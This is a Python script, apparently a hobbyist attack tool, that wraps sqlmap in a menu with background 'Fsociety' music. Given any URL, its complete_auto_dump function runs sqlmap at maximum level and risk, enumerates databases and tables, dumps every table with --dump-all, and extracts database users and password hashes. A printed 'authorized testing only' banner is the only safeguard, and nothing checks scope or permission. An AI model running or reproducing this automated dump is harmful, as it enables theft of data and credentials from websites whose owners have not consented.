#!/usr/bin/env python3
"""
ULTIMATE SQLMAP AUTO-DUMP WITH Fsociety MUSIC
Created by: mrzxx | Telegram: @Zxxtirwd
"""

import os
import sys
import time
import subprocess
import platform
import urllib.request
import threading
from colorama import Fore, Style, init

init(autoreset=True)

# URL Musik Fsociety
MUSIC_URL = "https://files.catbox.moe/ajumf5.mp4"
MUSIC_FILE = "fsociety_music.mp3"

# Global variables
music_enabled = True
music_thread = None

# ASCII Art
SQLMAP_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(SQLMAP_ASCII)
    print(Fore.CYAN + "=" * 80)
    print(Fore.YELLOW + " " * 25 + "SQLMAP AUTO-DUMP WITH MUSIC")
    print(Fore.CYAN + "=" * 80)
    print(Fore.GREEN + "   Creator: mrzxx | Telegram: @Zxxtirwd")
    status = Fore.GREEN + "ON" if music_enabled else Fore.RED + "OFF"
    print(Fore.CYAN + f"   Fsociety Music: {status}")
    print(Fore.CYAN + "=" * 80)

def download_music():
    """Download Fsociety music"""
    if not os.path.exists(MUSIC_FILE):
        print(Fore.YELLOW + "\n[*] Downloading Fsociety music...")
        try:
            urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
            print(Fore.GREEN + "[+] Music downloaded successfully!")
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Failed to download music: {e}")
            return False
    return True

def play_system_music():
    """Play music using system commands based on OS"""
    if not music_enabled:
        return
    
    system = platform.system().lower()
    
    try:
        if system == "windows":
            # Windows - use built-in media player
            os.system(f'start wmplayer "{MUSIC_FILE}" /play /close &')
            
        elif system == "linux":
            # Linux - use mplayer, mpv, or vlc
            players = ['mplayer', 'mpv', 'vlc', 'cvlc']
            for player in players:
                if os.system(f'which {player} > /dev/null 2>&1') == 0:
                    os.system(f'{player} "{MUSIC_FILE}" --really-quiet > /dev/null 2>&1 &')
                    break
            else:
                # Fallback to beep if no player
                import curses
                curses.initscr()
                curses.beep()
                curses.endwin()
                
        elif system == "darwin":  # macOS
            # macOS - use afplay
            os.system(f'afplay "{MUSIC_FILE}" &')
            
    except:
        # Fallback to simple beep
        try:
            print('\a', end='', flush=True)  # System bell
        except:
            pass

def stop_music():
    """Stop music"""
    global music_enabled
    music_enabled = False
    
    system = platform.system().lower()
    try:
        if system == "windows":
            os.system('taskkill /F /IM wmplayer.exe >nul 2>&1')
        elif system == "linux":
            os.system('pkill mplayer > /dev/null 2>&1')
            os.system('pkill mpv > /dev/null 2>&1')
            os.system('pkill vlc > /dev/null 2>&1')
        elif system == "darwin":
            os.system('pkill afplay > /dev/null 2>&1')
    except:
        pass
    
    print(Fore.YELLOW + "[*] Music stopped")

def toggle_music():
    """Toggle music on/off"""
    global music_enabled
    
    if music_enabled:
        stop_music()
    else:
        music_enabled = True
        print(Fore.GREEN + "[+] Music enabled")
        # Start music in background thread
        music_thread = threading.Thread(target=play_system_music, daemon=True)
        music_thread.start()

def check_dependencies():
    """Check required dependencies"""
    missing = []
    
    # Check SQLMap
    try:
        subprocess.run(['sqlmap', '--version'], capture_output=True, timeout=5)
    except:
        missing.append('sqlmap')
    
    # Check colorama
    try:
        import colorama
    except:
        missing.append('colorama')
    
    return missing

def install_dependencies(missing):
    """Install missing dependencies"""
    print(Fore.YELLOW + f"\n[*] Installing: {', '.join(missing)}")
    
    for dep in missing:
        if dep == 'sqlmap':
            os.system('pip install sqlmap')
        elif dep == 'colorama':
            os.system('pip install colorama')
    
    print(Fore.GREEN + "[+] Dependencies installed!")

def show_warning():
    print(Fore.RED + "\n" + "!" * 80)
    print(Fore.RED + "   WARNING: AUTHORIZED TESTING ONLY")
    print(Fore.RED + "   Use only on owned systems")
    print(Fore.RED + "!" * 80)

def run_sqlmap_command(cmd, step_name):
    """Run SQLMap command with colored output"""
    print(Fore.CYAN + f"\n[*] {step_name}")
    print(Fore.YELLOW + f"[*] Command: {cmd}")
    print(Fore.CYAN + "-" * 80)
    
    try:
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )
        
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            
            if line:
                line = line.strip()
                if 'target url' in line.lower():
                    print(Fore.CYAN + line)
                elif 'testing' in line.lower():
                    print(Fore.YELLOW + line)
                elif 'vulnerable' in line.lower() or 'injection' in line.lower():
                    print(Fore.GREEN + "[+] " + line)
                elif 'database:' in line.lower():
                    print(Fore.MAGENTA + "[DB] " + line)
                elif 'table:' in line.lower():
                    print(Fore.BLUE + "[TABLE] " + line)
                elif 'dump' in line.lower() or 'retrieved:' in line.lower():
                    print(Fore.GREEN + "[DATA] " + line)
                elif 'error' in line.lower() or 'failed' in line.lower():
                    print(Fore.RED + "[!] " + line)
                elif '|' in line and len(line.split('|')) > 2:
                    print(Fore.WHITE + line)
        
        print(Fore.CYAN + "-" * 80)
        return True
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted")
        return False
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        return False

def complete_auto_dump(target_url):
    """Complete automated SQL injection dump"""
    print(Fore.GREEN + f"\n[+] TARGET: {target_url}")
    print(Fore.GREEN + "[+] STARTING AUTO DUMP...")
    print(Fore.CYAN + "=" * 80)
    
    steps = [
        ("Phase 1: Detection", f'sqlmap -u "{target_url}" --batch --level=5 --risk=3'),
        ("Phase 2: Databases", f'sqlmap -u "{target_url}" --batch --dbs'),
        ("Phase 3: Current DB", f'sqlmap -u "{target_url}" --batch --current-db'),
        ("Phase 4: Tables", f'sqlmap -u "{target_url}" --batch --tables'),
        ("Phase 5: Dump All", f'sqlmap -u "{target_url}" --batch --dump-all --threads=10'),
        ("Phase 6: Schema", f'sqlmap -u "{target_url}" --batch --schema'),
        ("Phase 7: Users", f'sqlmap -u "{target_url}" --batch --users --passwords'),
    ]
    
    for step_name, cmd in steps:
        if not run_sqlmap_command(cmd, step_name):
            print(Fore.YELLOW + "[*] Skipping to next step...")
        time.sleep(1)
    
    print(Fore.GREEN + "\n" + "=" * 80)
    print(Fore.GREEN + "[+] AUTO DUMP COMPLETED!")
    print(Fore.CYAN + "=" * 80)

def main_menu():
    while True:
        print_header()
        
        print(Fore.YELLOW + "\n" + "-" * 80)
        print(Fore.CYAN + " " * 30 + "MAIN MENU")
        print(Fore.YELLOW + "-" * 80)
        
        print(Fore.GREEN + "\n[1] Start SQLMap Auto Dump")
        print(Fore.GREEN + "[2] Toggle Music ON/OFF")
        print(Fore.GREEN + "[3] Check Dependencies")
        print(Fore.GREEN + "[4] Exit")
        print(Fore.YELLOW + "-" * 80)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-4): " + Fore.WHITE).strip()
        
        if choice == "1":
            print(Fore.YELLOW + "\n[*] Enter target URL")
            print(Fore.YELLOW + "[*] Example: http://site.com/page.php?id=1")
            print(Fore.CYAN + "-" * 80)
            
            url = input(Fore.CYAN + "[>] URL: " + Fore.WHITE).strip()
            if url:
                if not url.startswith('http'):
                    url = 'http://' + url
                
                confirm = input(Fore.RED + "\n[?] Start attack? (y/N): ").lower()
                if confirm == 'y':
                    complete_auto_dump(url)
                    input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        
        elif choice == "2":
            toggle_music()
            time.sleep(1)
        
        elif choice == "3":
            missing = check_dependencies()
            if missing:
                print(Fore.RED + f"[!] Missing: {', '.join(missing)}")
                choice = input(Fore.CYAN + "[?] Install? (y/N): ").lower()
                if choice == 'y':
                    install_dependencies(missing)
            else:
                print(Fore.GREEN + "[+] All dependencies OK")
            input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        
        elif choice == "4":
            stop_music()
            print(Fore.CYAN + "\n" + "=" * 80)
            print(Fore.GREEN + "   Thank you for using SQLMap Tool")
            print(Fore.GREEN + "   Created by: mrzxx | Telegram: @Zxxtirwd")
            print(Fore.CYAN + "=" * 80)
            sys.exit(0)

def main():
    print_header()
    
    # Download music first
    print(Fore.YELLOW + "\n[*] Preparing Fsociety music...")
    if not download_music():
        print(Fore.RED + "[!] Music setup failed, continuing without music...")
        global music_enabled
        music_enabled = False
    
    # Check dependencies
    missing = check_dependencies()
    if missing:
        print(Fore.RED + f"[!] Missing: {', '.join(missing)}")
        choice = input(Fore.CYAN + "[?] Install now? (y/N): ").lower()
        if choice == 'y':
            install_dependencies(missing)
        else:
            print(Fore.RED + "[!] Need dependencies to run")
            sys.exit(1)
    
    # Start music
    if music_enabled:
        print(Fore.GREEN + "\n[+] Playing Fsociety music...")
        # Start music in background thread
        music_thread = threading.Thread(target=play_system_music, daemon=True)
        music_thread.start()
        time.sleep(2)  # Let music start
    
    show_warning()
    
    # Start main menu
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_music()
        print(Fore.RED + "\n[!] Program terminated")
    except Exception as e:
        stop_music()
        print(Fore.RED + f"\n[!] Error: {e}")
